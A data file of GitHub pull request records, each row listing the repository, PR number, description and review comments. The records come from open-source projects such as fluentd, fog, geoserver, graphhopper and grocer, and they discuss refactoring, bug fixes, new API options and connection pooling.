246,enspiral/loomio,571.0,,['']
247,expertiza/expertiza,359.0,"This is the pull request for Expertiza project OSS E808 - Refactoring and Testing participant.rb, assignment_participant.rb, course_participant.rb . 

Nithya Pari - npari
Shilpa Mairpady - smairpa
Vineeta Khurana - vkhuran2","['Merge this project last to avoid merge conflicts due to method name changes, specifically in `assignment_participant.rb`.']"
248,facebook/presto,924.0,,[]
249,facebook/presto,1046.0,,['Looks good']
250,facebook/presto,1275.0,"Add functions to train and use machine learning models (classifiers and
regressors) in Presto. This is currently only a proof of concept, and is
not ready for use in production. Example usage is as follows:

```sql
SELECT evaluate_classifier_predictions(label, classify(features, model))
FROM (
    SELECT learn_classifier(label, features) AS model
    FROM my_training_data;
)
CROSS JOIN my_validation_data;",['Looks good']
251,fatfreecrm/fat_free_crm,361.0,,['\n[![Coverage Status](https://coveralls.io/builds/1668885/badge)](https://coveralls.io/builds/1668885)\n\nCoverage decreased (-0.01%) when pulling **d022d639962741c64fde91987c923bbcf21a16ab on rails4_1** into **8fac6e1b2c0f6bf17790f6cfee5c5fdb60693943 on rails4**.\n']
252,fatfreecrm/fat_free_crm,406.0,,[]
253,fatfreecrm/fat_free_crm,408.0,,"['This is fine to merge, but I might turn off hound as they seem to disagree over what standards should be applied :)', 'I think we can turn off string literal and line length complaints some of\r\nthe others are usefull\r\n\r\nOn Tue Jan 20 2015 at 2:59:08 PM Steve Kenworthy <notifications@github.com>\r\nwrote:\r\n\r\n> This is fine to merge, but I might turn off hound as they seem to disagree\r\n> over what standards should be applied :)\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub\r\n> <https://github.com/fatfreecrm/fat_free_crm/pull/408#issuecomment-70592782>\r\n> .\r\n>']"
254,fazibear/colorize,43.0,,[]
255,fluent/fluentd,229.0,Another approach of https://github.com/fluent/fluentd/pull/224,"['LGTM :+1: ', ':+1: ', 'I commented for bool type https://github.com/fluent/fluentd/pull/224#issuecomment-30575366', ""@sonots @tagomoris Added '1' support in bool conversion."", ':+1: ', ':+1: ', 'If there is no comment, I will merge this pull request tomorrow.']"
256,fluent/fluentd,453.0,"For better error handling.
Plugin can catch TextParser specific error.","['@sonots @tagomoris Feel free to merge this PR.', ':+1: ', '@sonots Could you cherry-pick to v0.10? This change is needed for fluent-plugin-parser.', 'cherry-picked to v0.10 branch https://github.com/fluent/fluentd/commit/4a23a9ff293eff3cee870c44d2955981631e3d83']"
257,fluent/fluentd,466.0,,"['@repeatedly could you review?', 'How about removing top level field key parameters?\r\nOnly `<record>` directive support seems better than 2 configuration support.', ""Hmm, I want users' opinion about it. \r\n\r\n`<record></record>` is required to avoid conflicts record key names with option names, but personally, writing config everytime like:\r\n\r\n```\r\n<filter **>\r\n  type record_reformer\r\n  <record>\r\n    message foo\r\n  </record>\r\n</filter>\r\n```\r\n\r\nis bothersome, writing as below looks clean:\r\n\r\n```\r\n<filter **>\r\n  type record_reformer\r\n  message foo\r\n</filter>\r\n```"", 'After wrote Fluentd configuration, the configuration structure is less often updated.\r\nSo requiring `<record>` seems no problem.\r\n', ""Decided. Let's abide the rule of KISS. I will remove top level field key configuration. "", 'Removed top level configuration, and imported the change (failed to expand check) discussing at https://github.com/sonots/fluent-plugin-record-reformer/pull/11. ', 'I will squash before merging. ', ""How about changing the name?\r\n@kiyoto said 'reformer' is not good for this case.\r\nrecord_transformer or record_modifier?"", ""@repeatedly Don't we already have record_modifier? record_transformer sounds good to me."", '@kiyoto Yeah. I also think record_transfomer is good for this plugin.', 'Renamed to record_transformer, and squashed. ', 'Fixed. I will squash before merging. ', 'Squashed and merged!']"
258,fluent/fluentd,401.0,"`--config-test` is very useful, but it does not check file permission. This proposition is to make a rule to check file permissions in #configure method of each plugin because I thought it is impossible to check file permissions for each configuration parameter of each plugin from Fluentd side (Fluentd can not know what each plugin wants to do)

This pull request is just the first example of the proposition.

@repeatedly What do you think? Yes, each plugin author should support file permission check in #configure method of each plugin when we decide as this is an official way. 

PS. @repeatedly Could you tell me if you have a right place to put the file permission check utility function?
","[':+1: ', 'I will write a permission check for `out_file`, but the permission check will be limited because `out_file` would make dirs not only on `configure` but also on running loop dynamically. ', ""> PS. @repeatedly Could you tell me if you have a right place to put the file permission check utility function?\r\n\r\nI'm not sure. I put some socket utilities in https://github.com/fluent/fluentd/blob/master/lib/fluent/plugin/socket_util.rb.\r\nSo similar file is good for me."", ""@repeatedly Could you review?\r\n\r\n1. Add `FileUtil#wrtitable?` method\r\n2. Add file writable check for in_debug_agent's unix_path\r\n3. Add file writable check for out_file's path (This permission check is limited because out_file would make dirs not only on configure but also on running loop dynamically.)"", '@repeatedly ping', '@repeatedly fixed!', '\n[![Coverage Status](https://coveralls.io/builds/7307208/badge)](https://coveralls.io/builds/7307208)\n\nChanges Unknown when pulling **fd1b901cdc01e411c090e145591ed990b4532925 on writable_check** into ** on master**.\n']"
259,fluent/fluentd,147.0,for shutdown sequence (same as logs in running),"['update commit.', 'update commit once more.']"
260,fog/fog,1541.0,Allows networks CRUD and creation of servers with custom networks.,"['@brianhartsock @krames Mind taking a look when you have a moment?', ""Looks like tests failed because I didn't implement mocks. I'll see if I can knock those out tomorrow."", 'Thanks!', ""@krames @brianhartsock Updated with mocks. Last test run failed on 1.8.7 due to another provider's tests, so I re-triggered the build. Mind taking a final look?"", 'Looks good to me.', 'Thanks!']"
261,fog/fog,1930.0,Added Disks collection and Disk model to Google Cloud Compute and implemented a new insert server service method that allows all options for inserting a server to be used rather than just a subset. These changes were necessary to be able to create micro instances as a persistent disk must be manually specified in the micro instance request which was not possible before.,"['@jordanbull - thanks!\r\n\r\n@icco - could you review/merge? Thanks!', ""Yeah sure, just seeing this. \r\n\r\n@jordanbull, why are you creating a new type of insert_server? Is it possible to just modify the current insert_server? Seems like it's a pretty legit new way to do things.\r\n\r\nAlso, could you merge / rebase in master? Right now this won't do a clean merge."", ""@icco - my only reason for creating a new type of insert_server was to avoid breaking anyone's code that explicitly called the service insert_server rather than using the servers collection. If you think this is a minor enough case, I'd be happy to just make the changes in the existing insert_server instead. Also I can rebase this.\r\n\r\nLet me know if there's anything else I should do :)"", ""Yeah, since it's a relatively new endpoint (and in general fog promotes using the models over resources) I think it'd be better. \r\n\r\nAlso, why not add options as the last entry into insert_server() in https://github.com/fog/fog/blob/master/lib/fog/google/requests/compute/insert_server.rb instead of removing all of the current parameters? All of the paramaters are required by the GCE API currently."", ""I considered adding options as the last variable, but the issue I found was that you cannot include both an image and a disk and image is one of the existing variables and it seemed kind of messy to expect the user to know they must specify image as null if they specify the disk to use. And this was particularly relevant since micro instances must be made from a disk rather than an image.\r\n\r\nThe API is a bit misleading in stating that image is required, but then in the description stating that it doesn't need to exist if a persistent disk is specified (which is what must be done for micro instances)"", 'Ah, interesting. Well, I\'m down with shrinking the number of parameters, although I\'d like name to still be first. And heck, the ""mock"" is completely wrong, We just need to make sure we catch everywhere we are using it.', ""So I'll put the new implementation of insert_server in the old file then and just get rid of the new one? Also, I can add a descriptive error or warning to be thrown if it detects that the old parameters are being used so if it breaks anything, it'll at least be easy to detect and fix."", '@jordanbull - Sounds like a plan, thanks!', 'Were you thinking that I keep all parameters aside from image or only keep server_name and zone_name for simplicity sake?', '\n[![Coverage Status](https://coveralls.io/builds/106737/badge)](https://coveralls.io/builds/106737)\n\nCoverage remained the same when pulling **50f54278d74bea888aae77a1e05eead353ef1263 on jordanbull:master** into **a23d615ad54471af54807cd80dcc64bda325f0a6 on fog:master**.\n', ""I really like what you've done here @jordanbull! Thanks a ton. I've added a few comments. Some stupid style things, others suggestions for placement and questions about logic."", 'Yea, no problem. Thanks for all the feedback! This is my first time contributing to something open source.', '\n[![Coverage Status](https://coveralls.io/builds/109889/badge)](https://coveralls.io/builds/109889)\n\nCoverage remained the same when pulling **a3368acb1305321d815ceff761f842cc7ddb6a02 on jordanbull:master** into **a23d615ad54471af54807cd80dcc64bda325f0a6 on fog:master**.\n', ""Hmm, This isn't working for me... I tried running this and it wasn't working... https://gist.github.com/icco/1e258c0448e4cc501833#file-bootstrap-rb"", ""What aspect didn't work for you? When I run the code the server gets created fine, but it never gets past waiting for it to be sshable and I haven't touched that code. I am able to ssh into the instance from my command line though.\r\n\r\n--edit\r\nAhh I see now, it was getting stopped up at getting the external ip because that method uses the access config's name to find the ip as it is currently implemented."", ""Except for the comment above, this looks great. I'm curious what you're using to test this, so I can add it to my smoke tests in the future.\r\n\r\n@geemus, I'll be merging @jordanbull's commit soon, he's a first time committer FYI.  "", 'As for a smoke test, I use this: https://gist.github.com/jordanbull/a8a48e82352adf4571b7 since the majority of what I wrote deals with making and using a disk to create a simple micro instance.', '\n[![Coverage Status](https://coveralls.io/builds/110527/badge)](https://coveralls.io/builds/110527)\n\nCoverage increased (+0%) when pulling **d1cedb9ca2e35983e5eaff3b457ae04ee497a56c on jordanbull:master** into **a23d615ad54471af54807cd80dcc64bda325f0a6 on fog:master**.\n', 'Found a bug :(\r\n\r\n`Invalid value for field \'resource\': \'\'.  Cannot specify both an image and a boot disk.`\r\n\r\n```ruby\r\ntime = Time.now.utc.to_i\r\ndisk = CONNECTION.disks.create({:name => \'foggydisk\', :size => 10, :zone_name => \'us-central1-a\', :image_name => \'centos-6-v20130522\'})\r\n \r\ndisk.wait_for { disk.ready? }\r\nputs \'disk ready\'\r\ndisk = disk.get_as_boot_disk(true)\r\nparams = {\r\n    :machine_type => ""f1-micro"",\r\n    :zone_name => ""us-central1-a"",\r\n    :disks => [ disk ],\r\n    :kernel => \'gce-v20130522\',\r\n    :user => ENV[\'USER\']\r\n}\r\n \r\nserver = CONNECTION.servers.bootstrap params\r\np server.ssh([""uname -a"", ""whoami""])\r\n```\r\n\r\nBasically, in either create or insert_server (probably insert_server) you need to make sure you\'re not specifying both an image and a disk. Then in bootstrap, make sure that if a boot disk is specified, you unset the image default option.', 'Good catch. I figured for people not using bootstrap, The error the GCE API would throw would suffice, but forgot about using a disk in bootstrap. I obviously need to make bootstrap throw out the default image if a boot disk is specified. If the user specifies both a specific disk and image, should I throw an error or let the GCE API throw it?', ""@jordanbull, either way is fine. I think the error is pretty understandable, so it's fine to leave it. "", 'I left the errors the default API throws. The new changes remove the default image iff a boot disk is specified. A non boot disk can be specified with an image.', '\n[![Coverage Status](https://coveralls.io/builds/110610/badge)](https://coveralls.io/builds/110610)\n\nCoverage remained the same when pulling **a7eec9b1e9025887ce388ebb966a1c2c03fbd29e on jordanbull:master** into **a23d615ad54471af54807cd80dcc64bda325f0a6 on fog:master**.\n', 'Awesome! Looks, great. Merging @jordanbull. Nice work, and thanks again. ', 'Thanks!']"
262,fog/fog,2028.0,"    This patch refactors some of the code that would query global
    projects when get'ing images. It makes the list of global projects
    a constant on the Images collection, so that both 'get' and 'list'
    can use the same list of projects to query.
    
    Also, when bootstrapping/create'ing a server, the validation of
    the specified image name is done by trying to 'get' the image
    instead of 'save'ing it.
","['\n[![Coverage Status](https://coveralls.io/builds/142973/badge)](https://coveralls.io/builds/142973)\n\nCoverage increased (+0%) when pulling **d67a1f6ca92c0445121a8fdfa6b17e18bd1920ae on maginatics:gce_insert_image** into **ab25d09d9478e2a176d6730efac156ff9e116221 on fog:master**.\n', ""@amoghe - A good start, I've added some inline comments. I'd love an example in the examples dir as well."", 'See updated commit.', '\n[![Coverage Status](https://coveralls.io/builds/144516/badge)](https://coveralls.io/builds/144516)\n\nCoverage remained the same when pulling **f6624c28b082ccfa6a25a9ca64ea2d568cd35c65 on maginatics:gce_insert_image** into **7d46eb49596b82a461b00e0b9bcb8dc67ffee30b on fog:master**.\n', '@amoghe - a few more comments after testing a little.', '@icco, let me know what you think about my comments (re: bootstrap not working).', '\n[![Coverage Status](https://coveralls.io/builds/147507/badge)](https://coveralls.io/builds/147507)\n\nCoverage remained the same when pulling **5fb4bd332aa3cb1a716d35891328cf2f7b50d183 on maginatics:gce_insert_image** into **10fa1c4924b77271c011cd2f5632aae1bcdf57af on fog:master**.\n', '@icco the latest [commit](https://github.com/maginatics/fog/commit/5fb4bd3) introduces the changes I proposed earlier. LMK if you have comments on this. I have another patch that builds on this to actually introduce support for creating images in GCE via fog.', 'Seems pretty reasonable. Still reading through. Two things I\'ve seen so far:\r\n\r\n```\r\n[DEPRECATION] #connection is deprecated, use #service instead (/Users/natwelch/Projects/fog/lib/fog/google/models/compute/images.rb:39:in `block in get\')\r\n```\r\n\r\nAnd\r\n\r\n```\r\nParameter \'image\' has an invalid value: {:name=>""debian-7-wheezy-v20130617""}. Must match: /^[a-z](?:[-a-z0-9]{0,61}[a-z0-9])?$/.\r\n```\r\n\r\nWhen calling\r\n\r\n```ruby\r\n  connection = Fog::Compute.new({ :provider => ""Google"" })\r\n\r\n  server = connection.servers.bootstrap\r\n  server.wait_for { sshable? }\r\n\r\n```', 'I like this a lot, please see the bug I found, because other than that, this looks awesome @amoghe. ', 'Pushing a new patch that contains:\r\n 1. fix for deprecation warning (switch to using ```service``` instead of ```connection```)\r\n 2. fix the error in ```server.bootstrap``` (by fixing the query for get_image)\r\n 3. Tweak the comment regarding ```attribute :project```', '\n[![Coverage Status](https://coveralls.io/builds/148424/badge)](https://coveralls.io/builds/148424)\n\nCoverage remained the same when pulling **f380ff1de90bc66294245652b95bd0f649c6bc24 on maginatics:gce_insert_image** into **45687f68c18ed2cef36b0da4271fa4ddb46da778 on fog:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/149398/badge)](https://coveralls.io/builds/149398)\n\nCoverage remained the same when pulling **b42d86360c4b8c4e031389efa77f5332b7f4d8d7 on maginatics:gce_insert_image** into **607aee725eb3b6412db1defa66fb56daab59b66d on fog:master**.\n', ""I'm going to merge this. See comments on https://github.com/fog/fog/commit/f380ff1de90bc66294245652b95bd0f649c6bc24 for a couple of suggestions on improving this in the future."", ""Thanks!\r\n\r\n\r\nOn Wed, Aug 7, 2013 at 1:39 PM, Timur Alperovich\r\n<notifications@github.com>wrote:\r\n\r\n> I'm going to merge this. See comments on f380ff1<https://github.com/fog/fog/commit/f380ff1de90bc66294245652b95bd0f649c6bc24>for a couple of suggestions on improving this in the future.\r\n>\r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub<https://github.com/fog/fog/pull/2028#issuecomment-22273655>\r\n> .\r\n>"", 'https://github.com/fog/fog/pull/2049 <-- the ""real"" patch that addresses the issue (ie - allow users to create images in GCE)']"
263,garethr/garethr-docker,220.0,Acceptance tests,"[""This can now be merged I believe. I've added a Temp hack to require the latest device-mapper for RHEL7/CentOS7 and also install docker from the rhel-extras repo for RHEL7.""]"
264,gedankenstuecke/snpr,177.0,,['']
265,gedankenstuecke/snpr,182.0,,['']
266,geoserver/geoserver,869.0,Please look at the following JIRA: https://jira.codehaus.org/browse/GEOS-6809. Note that the following pull request will move 2 classes (SingleGranuleGridCoverageReader.java and GranuleCoverageInfo.java) from the wcs2.0-eo module to the wcs2.0 one.,"[""Nope, you're letting WCS 2.0 know about EO conventions, and the code will now respond to granule descriptions even if the EO extension is missing or not active for that particular coverage.\r\nPlease rework it to make it pluggable, keep the EO knowledge in the EO plugin, and make sure the granules are described only if the coverage is EO enabled (and EO itself is active)."", ""Since you have fixed the code as per Andrea's recommendations, it seems good to me.\r\n""]"
267,geoserver/geoserver,912.0,Fix for [GEOS-6850](https://jira.codehaus.org/browse/GEOS-6850).  Made FileSystemWatcher and GuavaAuthenticationCacheImpl DisposableBeans so they can shut down their ExecutorServices.  Also made the threads Daemons to reduce the impact of failing to shut them down and gave them identifiable names to make debugging easier.  Added a Disposer object to dispose of the objects in situations where they have been created after Spring context startup as discussed on the mailing list.,"['Had a cursory look, not seen anything wrong. Question, can we try and backport as this is useful on 2.6.x as well?', '@simboss Yes I was planning to backport it.', 'Cool, thanks for the feedback.', 'Hum... I have a worry left here... that we are replacing a shutdown issue with a slow OOM. All the file resources built during normal operation are accumulated in the disposer, which keeps them in memory forcefully until the application ends, thus accumulating them for a long time (a GeoServer can be left running for months).\r\n\r\nSuggestion: make the disposer act as a soft/weak cache, and when a object is not longer referenced by anything else, dispose of it immediately. The caches in resource pool, with a method invoked when a object needs to be released, can provide some guidance on how to implement it (and maybe Guava has some solution of its own to this problem).', ""Nice catch.  Unfortunately I may have to fall back to just the daemon threads as I don't think I have time to mess with weak references.  I'll try to work it in though."", 'Kevin, we cannot have a thread leak, a vm only has 32k of those. If we\nstart accumulating file watchers with some relationship with requests the\nvm will get out of native threads in minutes and then just fail every\nrequest.\n\nDid you check that\'s not the case?\nIl 10/feb/2015 19:12 ""Kevin Smith"" <notifications@github.com> ha scritto:\n\n> Nice catch. Unfortunately I may have to fall back to just the daemon\n> threads as I don\'t think I have time to mess with soft references. I think\n> my existing Disposer API probably needs re-working as well, possibly to a\n> factory for executors, unless I do something funny with proxies.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/geoserver/geoserver/pull/912#issuecomment-73751507>.\n>\n', ""The FileSystemWatcher is created lazily by the FileSystemResourceStore so thread pools only start up if something tries to add a listener.  The capacity to create a listener is built into the Resource interface though so anywhere a Resource goes, the potential to start up a thread pool goes with it.  The pool is tied to the Store not the Resource though so the upper limit is constrained by the number of FileSystemResourceStores created.\r\n\r\nLooking at the call graphs for creation of FSRSes, it's looking much better than when remember when when I started on this. Most of the calls are in unit tests.  Those that aren't are in init code that should just run once.\r\n\r\nI was sure I remembered seeing a method that created an FSRS and returned it as a plain ResourceStore and had a fairly broad call tree but I can't see that now.  I am pretty sure I mistook at least one of the unit tests for a non-test earlier. \r\n\r\nSo we seem to be safe for now but is someone were to create a FSRS in a request and then watch one of its resources, we'd be in trouble."", ""I've simplified it to just do the Daemon threads, naming the threads for easier debugging, and making the cache and watcher classes disposable without making any effort to dispose of them. This should fix the immediate problem of stalled shut down and we can worry about ensuring that it is more resistant to the creation of thread leaks when work on the ResourceStore API resumes. Management of ResourceStore lifecycles will probably need to be dealt with as part of providing a JDBC backed implementation of it anyway."", ""Merging per today's GT/GS PSC meeting.""]"
268,geoserver/geoserver,973.0,,"['All my feedback has been addressed, anyone else want to review or can I merge. Jim this is your section of the codebase please commit here as needed.\r\n']"
269,geoserver/geoserver,997.0,"Please look at the following Proposal: https://github.com/geoserver/geoserver/wiki/GSIP-128---JAI-EXT-integration-in-GeoServer

Notice that the following PR will require that https://github.com/geotools/geotools/pull/799 and https://github.com/geoserver/geoserver/pull/991 have already been merged.","['@bmmpxf can you help review this one as it some doc changes.\r\n\r\n@n-lagomarsini the screen snap provided is very wide for our docs - not sure if mike has any guidance on this?', 'Hi Jody,\r\n\r\nI have reduced the image size as you requested.\r\n\r\nRegards,\r\nNicola']"
270,github/hub,535.0,All `features/fork.feature` is passing now.,"[""@mislav testing host name is now available with https://github.com/github/hub/commit/6ab839f2a8efa7ffc7c3b943b3c402fadbee434a. And I put back the filters: https://github.com/github/hub/commit/3c7580800393aea97557a68ba97ca8d6033f14c8. :smile_cat: \r\n\r\nI'll need to wait for the merge of https://github.com/octokit/go-octokit/pull/60 in `octokit` before merging this PR."", 'Nice :+1: ']"
271,github/hub,600.0,":warning: This is my work in progress; some cukes still fail

/cc @jingweno","['w00t, got it passing; please review before merge.']"
272,github/hub,624.0,"Use Go build tag to build with/without autoupdate. For Homebrew, we build with `./script/build noupdate` and let it handle the update. We could also build with `./script/build` which has autoupdate built-in.

/cc @mislav ",[]
273,gjtorikian/html-proofer,93.0,"Based on https://github.com/gjtorikian/html-proofer/issues/41#issuecomment-52594922 by @nschonni

I will try to fix it here.","['I think it\xe2\x80\x99s ready.', 'It would be nice to see a test showing `directory_index` in action, e.g.:\r\n\r\n``` ruby\r\noptions = { : directory_index =>""index.php"" }\r\nlink_pointing_to_directory = ""#{FIXTURES_DIR}/links/link_pointing_to_directory.html""\r\noutput = capture_stderr { HTML::Proofer.new(link_pointing_to_directory, options).run }\r\n```', '> It would be nice to see a test showing directory_index in action\r\n\r\nDone.', ':+1: :sparkles: ']"
274,google/auto,16.0,"Highlights:
  * Testing is now a 1-liner
  * Tests no longer require `File`s
  * Enable the ability to check `Diagnostic` messages","['Travis failed on a line length issue. :/', ""Reviewed.  I'm crazy excited about this. "", 'PTAL', 'LGTM']"
275,google/auto,20.0,"...repository (javadoc and source jars created, and gpg signing.)

As of now, gpg signing, javadoc and source jar creation is off by default.  To activate it (and deploy the binaries to maven central), you would do this:

```
mvn  -Prelease clean deploy -Dgpg.keyname=YOURKEYNAME
```
","['PTAL', ""One last thing and then we're good.""]"
276,google/closure-compiler,530.0,"Also fix a couple typos.

It is nice to know that `--compilation_level ADVANCED --process_closure_primitives` is redundant. Plus it simplifies other documentation like in the [Closure Library](https://github.com/google/closure-library/pull/312).",[]
277,google/closure-compiler,775.0,I'm using this successfully in a couple of projects. CLA was filed this morning.,"[""@MatrixFrog Yeah, you're right. This is my first go at writing externs for others to consume, so sorry for the sloppiness. I've updated the PR with a squashed commit that includes more precise type expressions."", 'Updated the PR with more stringent return types.', ""Let's hope that does the trick. I didn't realize that such things were implicit, which I take as my defense w.r.t. return type nullability in general. :-)"", ""Sorry, I'm way behind on pull requests. Thanks!""]"
278,graphhopper/graphhopper,434.0,"still to do
* [x] handle case of query graph request at tower nodes
* [x] tests","['Thanks!\r\n\r\nThe U-turn instruction should be made also for via points, but we should move this out of this issue: #289\r\n\r\nWill comment inline...', ':+1:\r\nIs this related to #225 ?', ""Yes (but will not work with CH')"", 'regarding the wording: i liked the dichotomy of ```preferredDirection``` vs. ```dispreferredEdge```, so  shall we do now ```superiorDirection```and ```inferiorEdge``` ? Or what do you think of ```favoredDirection``` and ```unfavoredEdge```? ', ""this is good: 'favoredDirection and unfavoredEdge'"", '\r\n> setDispreferedEdge(int edgeId, int adjNodeId)\r\n> this method is requiered to disprefer the incoming edge at via points.\r\n> one could achieve this also by calculating the incoming azimuth, and then use the above method. \r\n> But in my feeling this would be a quite indirect. \r\n\r\nHmmh, not sure what you mean here. I would prefer to have just two simple methods in QueryGraph: enforceDirection and dropDirectionEnforcement without any ifs before but probably with more required parameters. Even if we pass the endEdge if it is not necessary. BTW: why -2 in `paths.get(placeIndex - 2).getFinalEdge()`?\r\n\r\nAlso for me `QueryGraph.setDispreferedEdge` is misleading as it suggests one can set any edge but then throws exception for none-virtual edges.\r\n\r\n>  Include instructions for UTurn at start\r\n\r\nWhy only at start? E.g. if costs are low u-turn can happen also elsewhere. But again: we should move this out of this issue and into: #289\r\n', '> not sure what you mean here. I would prefer to have just two simple methods in QueryGraph: enforceDirection and dropDirectionEnforcement without any ifs before but probably with more required parameters\r\n\r\nI mean, the two methods are applied in two different scenarios. In the one scenario I know only the direction I want to prefer, in the other scenario I have no clue which direction I want to prefer but already know the edge to disprefer. One could use the information in the second scenario, extract from the edge an direction, and then use this direction to feed it into the first scenario. But I dislike this, as it is unnecessary computational overhead. \r\nRegarding your suggestion to use one method for both, its sounds like putting two things together which do not belong together (I exaggerate here a bit, but in the end it has to look similar like this)\r\n```java\r\nfavorDirectionOrUnfavorVirtualEdge(double favoredDirection, QueryResult queryPoint, boolean incoming, EdgeIteratorState unfavoredEdge)\r\n{ if (unfavoredEdge == EdgeIteratorState.NO_EDGE)\r\n{\r\nfavor direction\r\n}\r\n else\r\n{\r\nunvafor edge\r\n} \r\n```\r\n\r\nTo be more constructive, (1) in the GraphHopper Class I can remove a lot of ifs by doing all the validity checking within the QueryGraph and (2) a rename of  ```setDispreferedEdge``` in  ```setUnfavoredVirtualEdge``` should make the usage much more clear\r\n\r\nThis are my two cents, but if I still could not convince you, I will implement it like this, since you have the bigger picture in mind :)\r\n\r\n ', '> BTW: why -2 in paths.get(placeIndex - 2).getFinalEdge()\r\n\r\n```placeIndex``` is initialised by 1, that is for ```placeIndex==1``` the first path is calculated and then stored in the list ```pathes``` at the first position (i.e. at 0 with a zero based index). This path is not affected by the requirement for straight via routing.\r\nThen for the next path, i.e. ```placeIndex==2```, we have to get the final edge of the previous path (which is the first path and stored at the 0th position in the ```pathes``` list).  Therefore it is at position 2-2=0.', '>>    Include instructions for UTurn at start\r\n\r\n> Why only at start? \r\n\r\nHere my reasoning was, that u-turns at via points are old behaviour. But with this code u-turns also can occur at start, which did not existed before. Therefore I regarded it as part of this issue, whereas the other u-turns seemed not directly related to this code.\r\n\r\nBut now I removed also the start u-turns to issue  #289\r\n', 'open questions:\r\n* [x]  ```_default``` in ```EdgeIteratorState.getBoolean()```?  -> kept!\r\n* [x] location of ```K_UNFAVORED_EDGE```? -> kept in EdgeItaretorState! \r\n* [x] 2 methods ```queryGraph.favorDirection``` and ```queryGraph.unfavorEdge```? -> similar method ```enforceDirection``` and  ```enforceDirectionByEdgeId```', '* [x] fix bug: direction parameters do not do not influence result for route? endpoint \r\nbug was in test :)', 'renamed ```direction``` parameter to ```heading```', 'Looks now good to me!', ""On my behalf, I'm done"", 'Would you mind to squash once again :) and move MyTest into the normal (j)unit testing?', '> and move MyTest into the normal (j)unit testing\r\n\r\nuups, this should not have been  comited , will remove it ', ""I'm wondering if it's worth it to have also elsewhere the angle in human friendly degrees (0, 360) e.g. like [here](https://github.com/graphhopper/graphhopper/blob/master/core/src/main/java/com/graphhopper/util/RoundaboutInstruction.java#L70-L85)"", 'Hmmh, yes this should also be changed but probably in another issue: #424 \r\n\r\n@jansoe the problem is now that turn_angle is in radian and already included in the json :(', ""I would prefer consistent angles, and we can't revert turn_angle using degree without breaking several clients OR introducing two versions of the API for the switchover (see new #437). And as we already have an 'inconsistent state' (GPX export is using degree for gh:azimuth) I vote to keep using degree here and fix turn_angle via #437 later. \r\n\r\nPlease vote for or against this :) !"", 'I generally vote for using SI units in engines, though degrees (0-360) is the common way for angles.\r\nUsers can always convert the returned values later to their liking.\r\n\r\nOf course you are right about existing implementation, an established API is hard to change.', ""thanks. and yes, I would not have a problem with breaking the Java API (maybe we should do this even earlier) because this is relative easy to detect and fix for consuming developers, but the JSON API can't be changed as easily (this is what we now feel ourself with running the GH Directions API ;))"", 'I vote for using degrees in this PR, and sometime, with other major changes,  also swap radians in roundabouts.', 'Thanks a lot @jansoe ! Merged!', 'BTW: should we throw an UnsupportedException if someone wants to use it with CH?', ""I'm undecided. On the one hand it will also work with CH in many cases, on the other hand, you sometimes get this artefacts ....\r\n"", 'Great work @jansoe for a valuable feature!', ""Yeah, me too. Still the problem is that CH is the default and people will report this as bug although this is 'known'. Maybe we throw an exception but allow via parameter in the GraphHopper class to make it still working?""]"
279,gregorym/bump,20.0,"- All tests pass
- Little bit change in gemspec to add dev deps here
- Add tests to coverage new feature

No need to thanks :)","[""travis fails with $ bundle install\r\n33install: 'bundle install' returned false.\r\n34Done. Build script exited with: 1"", 'Now passing.']"
280,grocer/grocer,35.0,"As promised, here is the support for connection pooling. It is used always, but in a single-thread environment it won't change anything.

There is a new option to `Grocer.pusher` for `:pool_size` (defaults to 5). This option is not passed along to `PushConnection`, but the remaining options are.

``` ruby
pusher = Grocer.pusher(certificate: my_cert, pool_size: 8)
pusher.push(notification)
```

Internally `.pusher` just creates a `PushConnectionPool` instead of a `PushConnection`. The connection pool has an `#acquire` method that accepts a block and consumes an open connection until the block returns. The pool fills lazily, until it reaches it's maximum size (i.e. 5 simultaneous threads sending a push notification at once), at which point other requests to write to the pool must wait in a queue.

The connection pool has a `#write` method to hide the fact it needs to acquire and release connections internally.","['Implemented changes to specs as discussed. That syntax works fine ;)', '@vanstee or @alindeman Do either of you have any feedback? Or any ideas how we might be able to get some integration tests around this? Threading is always a bit tricky, so I want to make sure we get this right before merging it.', 'Since adding connection pooling will probably increase the complexity of the gem, it might be nice to have some numbers on how it improves performance so we can better make that decision between trade-offs.', ""@vanstee it's not about performance, it's about thread safety (for us anyway). I might actually just make the connection pool wrapper a bit more generic and release it as a standalone gem that can be used with various things that require pooling (with a tiny bit of subclass/configuration)... that was the user can decide to use it or not. That's pretty much what we've done at @flippa in order to use Grocer in a thread-safe way."", '@vanstee what Queues are you referring to? Like redis or something?', '@d11wtq Ruby has a built-in thread-safe queue implementation http://www.ruby-doc.org/stdlib-1.9.3/libdoc/thread/rdoc/Queue.html', 'Hrm. Actually thinking about that again now, using a `Queue` might make it tough to remove a connection from the `used` queue.', 're: thread-safety vs. performance.\r\n\r\nTypically connection pools are about performance - they allow reusing connections rather than having to constantly establish and clean up connections, which can be quite expensive.\r\n\r\nThis implementation also happens to be thread safe since it `synchronize`es around acquiring/releasing and creating connections in the pool.\r\n\r\nDoes that make sense?', 'So if the main purpose of adding connection pooling support is actually just to make things thread-safe, @d11wtq would you be happy with just wrapping up `#push` in a `synchronize` block?', 'So the problem with synchronizing is that it too is slow when you have multiple threads each needing to push and establish those connections. It seems like this solution might just fit the bill. Yes, no?', 'Sure works for me.', 'Would love to see this merged. :+1: ', '@d11wtq Just curious, at what point (and how) do you initialize Grocer for Sidekiq to share the connection pool? ', '@d11wtq did you consider just using the Connection Pooling method explained here https://github.com/mperham/sidekiq/wiki/Advanced-Options (end of page)?', ""We have a singleton that wraps grocer and we just do it in there. We haven't monkey-patched grocer, we're just wrapping a connection pool around it.\r\n\r\nIl giorno 05/mar/2013, alle ore 13:40, Carl Mercier <notifications@github.com> ha scritto:\r\n\r\n> @d11wtq Just curious, at what point (and how) do you initialize Grocer for Sidekiq to share the connection pool?\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.\r\n> "", '@cmer the connection_pool gem referenced in the wiki page you link to could be more desirable to the grocer team, since it moves the responsibility for maintaining the pool to the maintainers of that gem (looks like Mike Perham right now). Thoughts guys? Happy to submit a different PR that explores that too.', 'I personally would prefer using the connection_pool gem. Less moving parts is always good.', ""I'll review some options and try to make some real progress on this tonight. Sorry for how long it's taken to get this merged in. Thanks @d11wtq and @cmer."", ""IMO, as long as Grocer is 